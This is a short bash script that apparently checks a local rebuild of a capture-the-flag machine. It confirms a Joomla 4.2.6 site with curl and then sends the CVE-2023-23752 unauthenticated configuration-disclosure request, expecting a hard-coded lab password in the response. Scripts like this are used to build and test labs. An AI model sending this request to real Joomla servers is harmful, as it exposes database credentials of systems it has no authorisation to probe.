#!/bin/bash
set -euo pipefail
URL="${1:-http://127.0.0.1:8080}"
echo '[1/4] main site'
curl -fsS -H 'Host: devvortex.htb' "$URL/" | grep -q DEVVORTEX
echo '[2/4] Joomla version file'
curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/manifests/files/joomla.xml" | grep -q '4.2.6'
echo '[3/4] Joomla admin'
curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/" | grep -qi 'joomla\|login'
echo '[4/4] CVE-2023-23752 configuration disclosure (requires actual vulnerable Joomla response)'
response=$(curl -fsS -H 'Host: dev.devvortex.htb' "$URL/api/index.php/v1/config/application?public=true")
if ! grep -q 'P4ntherg0t1n5r3c0n##' <<<"$response"; then echo 'FAIL: disclosure response did not include the expected lab credential' >&2; exit 1; fi
printf 'PASS: all HTTP checks\n'
